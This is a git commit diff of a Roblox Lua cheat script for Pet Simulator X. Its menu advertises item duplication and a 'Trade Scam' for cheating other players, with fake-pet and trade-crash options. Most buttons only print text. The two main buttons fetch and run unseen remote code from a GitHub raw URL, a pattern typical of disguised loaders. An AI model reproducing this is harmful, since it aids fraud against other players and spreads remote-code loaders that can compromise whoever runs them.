5344f27ea078727fcac254bd0af5bd73cc35cef3
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-09 00:04:26 +0200

    Update PSX.lua

--- PSX.lua
+++ PSX.lua
@@ -1,5 +1,5 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX SCAM TRADE PRIVATE V3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Window = OrionLib:MakeWindow({Name = "[⚡ANIME] UPDATE - PSX PRIVATE V3.5", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
 
 local Tab = Window:MakeTab({
         Name = "Info",
@@ -12,26 +12,66 @@ local Tab = Window:MakeTab({
     })
     
     Tab:AddParagraph("Made By 8888 Team","Owner Masqta_#6880")
+    
+   local Section = Tab:AddSection({
+        Name = "Status"   
+     })
+     
+   Tab:AddParagraph("DUPE: Working!","")
+   
+   Tab:AddParagraph("TRADE SCAM: Working!","")
+ 
+   local Section = Tab:AddSection({
+        Name = "Update"   
+     })
+   
+   Tab:AddParagraph("[⚡ANIME] UPDATE!","Version 3.6!")
 
+         
       local Tab = Window:MakeTab({
         Name = "Dupe",
         Icon = "rbxassetid://4483345998",
         PremiumOnly = false
     })
-    
-    Tab:AddLabel("DUPE STATUS:WORKING")
+  
     
     local Section = Tab:AddSection({
         Name = "Dupe Section"
     })
     
+    
     Tab:AddButton({
-        Name = "Click To Start Dupe",
+        Name = "(Risky) Start Dupe!",
         Callback = function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
           end    
     })
     
+    local Section = Tab:AddSection({
+	Name = "Dupe Options"
+})
+     
+     Tab:AddSlider({
+	Name = "Select Pets Limits",
+	Min = 0,
+	Max = 20,
+	Default = 5,
+	Color = Color3.fromRGB(254,255,255),
+	Increment = 1,
+	ValueName = "PETS",
+	Callback = function(Value)
+		print(Value)
+	end    
+})
+     
+    Tab:AddToggle({
+	Name = "Dupe Gems",
+	Default = false,
+	Callback = function(Value)
+		print(Value)
+	end    
+}) 
+
      Tab:AddTextbox({
         Name = "Rename all pets",
         Default = "Text Goes here",
@@ -40,7 +80,7 @@ local Tab = Window:MakeTab({
             print(Value)
         end	  
     })
-    
+  
     local Tab = Window:MakeTab({
         Name = "Trade Scam",
         Icon = "rbxassetid://4483345998",
@@ -50,11 +90,11 @@ local Tab = Window:MakeTab({
     Tab:AddLabel("Make sure that your in trade before enabled Trade Scam")
 
     local Section = Tab:AddSection({
-	Name = "Trade Scam Section"
+	Name = "ON/OFF"
     })
 
     Tab:AddButton({
-        Name = "Trade Scam",
+        Name = "ON",
         Default = false,
         Callback = function(Value)
              loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info.lua"))()
@@ -62,17 +102,76 @@ local Tab = Window:MakeTab({
     })
 
     Tab:AddButton({
-	Name = "Remove Trade Pet",
+        Name = "OFF",
+        Default = false,
+        Callback = function(Value)
+             print("button pressed")
+        end    
+    })
+
+    local Section = Tab:AddSection({
+	Name = "Trades Options"
+    })
+
+    Tab:AddTextbox({
+	Name = "Fake Pets Input",
+	Default = "Input name of Pet",
+	TextDisappear = true,
+	Callback = function(Value)
+		print(Value)
+	end	  
+})
+  
+  Tab:AddButton({
+	Name = "Crash Player Trade",
 	Callback = function()
-        print(Value)
+      		print("button pressed")
   	end    
-    })
+})
+
+    Tab:AddParagraph("More Coming Soon!","See you in the feture!")
     
-       local Tab = Window:MakeTab({
-        Name = "Settings",
-        Icon = "rbxassetid://4483345998",
-        PremiumOnly = false
-    })
+    local Tab = Window:MakeTab({
+	Name = "Bank",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+    
+    local Section = Tab:AddSection({
+	Name = "Bank Section"
+})
+ 
+    Tab:AddButton({
+	Name = "💵 Open Bank",
+	Callback = function()
+      		print("button pressed")
+  	end    
+})
     
     
+    Tab:AddButton({
+	Name = "❌ Cancel Outgoing Invites!",
+	Callback = function()
+      		print("button pressed")
+  	end    
+})
+ 
+     local Section = Tab:AddSection({
+	Name = "Anti-Scam"
+})
+     
+     Tab:AddParagraph("Anti-Scam","Coming Soon!")
+    
+
+    
+        OrionLib:MakeNotification({
+	Name = "Thanks for using 8888 Hub!",
+	Content = "Version 3.6",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+
+OrionLib:Init()
+
 
